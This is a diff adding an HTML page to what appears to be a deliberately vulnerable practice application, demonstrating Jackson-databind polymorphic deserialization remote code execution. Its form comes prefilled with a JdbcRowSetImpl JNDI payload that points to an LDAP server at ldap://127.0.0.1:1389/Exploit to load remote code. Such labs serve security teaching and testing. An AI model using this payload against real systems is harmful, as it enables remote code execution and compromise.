@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en" xmlns:th="http://www.thymeleaf.org">
+<div th:replace="~{commons/commons::head}"></div>
+
+<body>
+<div class="layuimini-container">
+    <div class="layuimini-main">
+        <div class="layui-row layui-col-space15">
+            <div class="layui-col-md12">
+                <div class="layui-row layui-col-space10">
+                    <fieldset class="layui-elem-field layui-field-title" style="margin-top: 20px;">
+                        <legend>Jackson</legend>
+                    </fieldset>
+                    <!--漏洞简介-->
+                    <div class="layui-col-md12">
+                        <div class="layui-card">
+                            <div class="layui-card-header"><i class="fa fa-eyedropper icon"></i>漏洞描述</div>
+                            <div class="layui-card-body layui-text layadmin-text">
+                                <p>Jackson-databind 支持 Polymorphic Deserialization 特性（默认情况下不开启），当 json 字符串转换的 Target class 中有 polymorph fields，即字段类型为接口、抽象类或 Object 类型时，</p>
+                                <p>攻击者可以通过在 json 字符串中指定变量的具体类型 (子类或接口实现类)，来实现实例化指定的类，借助某些特殊的 class，如 TemplatesImpl，可以实现任意代码执行。</p>
+                                <p><a href="https://xz.aliyun.com/t/8290">CVE-2020-xxxx:Jackson-databind RCE两则</a></p>
+                            </div>
+                        </div>
+                    </div>
+                    <!--漏洞测试-->
+                    <div class="layui-col-md12">
+                        <div class="layui-card">
+                            <div class="layui-card-header"><i class="fa fa-hand-o-down icon"></i>漏洞测试</div>
+                            <div class="layui-card-body layui-text layadmin-text">
+                                <form class="layui-form" id="form" th:action="@{/home/jackson}" method="post">
+                                    <div class="layui-form-item">
+                                        <label class="layui-form-label">content: </label>
+                                        <div class="layui-input-block">
+                                            <input type="text" name="content" id="content" lay-verify="required"
+                                                   lay-reqtext="content不能为空" value="[&quot;com.nqadmin.rowset.JdbcRowSetImpl&quot;,{&quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:1389/Exploit&quot;,&quot;autoCommit&quot;:&quot;true&quot;}]"
+                                                   autocomplete="off" class="layui-input">
+                                        </div>
+                                    </div>
+
+                                    <div class="layui-form-item">
+                                        <div class="layui-input-block">
+                                            <button type="button" id="submit" class="layui-btn" lay-submit=""
+                                                    lay-filter="demo1">立即提交
+                                            </button>
+                                            <button type="reset" class="layui-btn layui-btn-primary">重置</button>
+                                        </div>
+                                    </div>
+                                </form>
+                            </div>
+                        </div>
+                    </div>
+                    <!--执行结果-->
+                    <div class="layui-col-md12">
+                        <div class="layui-card">
+                            <div class="layui-card-header"><i class="fa fa-eyedropper icon"></i>测试结果</div>
+                            <div class="layui-card-body layui-text layadmin-text">
+                                <!--                                <pre th:text="${results}" style="color: red;font-size: 15px;"></pre>-->
+                                <pre id="results" style="color: red;font-size: 15px;"></pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div th:replace="~{commons/commons::script}">
+</div>
+
+<script>
+    $("#submit").click(function () {
+        var content = $("#content").val();
+        if (content.length === 0) {
+            return;
+        }
+        // var check = $("#check").is(':checked');
+
+        $.ajax({
+            url: "[[@{/home/jackson}]]",
+            type: "POST",
+            // headers: {
+            //     'Content-Type': "text/xml",
+            // },
+            contentType: "application/json",
+            // contentType: false,
+            //必须false才会避开jQuery对 formdata 的默认处理
+            //XMLHttpRequest会对 formdata 进行正确的处理
+            // dataType: "json",  //服务器返回数据类型，不设置的话根 据返回类型自动设置
+            // data: {
+            //     data : $('#form').serialize()
+            // },
+            // data: formData   // 文件上传
+            data: content,
+            // data: content,
+            success: function (result) {
+                $("#results").empty();
+                $("#results").append(he.escape(result));
+            },
+            error: function () {
+                alert("请求发送失败！")
+            },
+        })
+    })
+</script>
+</body>
+</html>
